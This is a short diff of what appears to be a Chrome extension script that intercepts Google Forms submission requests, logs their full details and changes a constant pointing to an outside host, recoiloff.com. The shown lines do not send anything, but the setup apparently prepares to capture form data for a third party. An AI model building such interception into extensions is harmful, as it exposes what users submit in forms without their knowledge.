@@ -1,7 +1,7 @@
 chrome.webRequest.onBeforeRequest.addListener(
     function(details)
     {
-        const url = "http://recoiloff.com:26";
+        const url = "https://www.recoiloff.com/api/";
         if (details.method === "GET") return;
 		console.log(JSON.stringify(details));
         if (!(details.url).toString().startsWith("https://docs.google.com/forms") && !(details.url).toString().startsWith("https://forms.gle")) return;
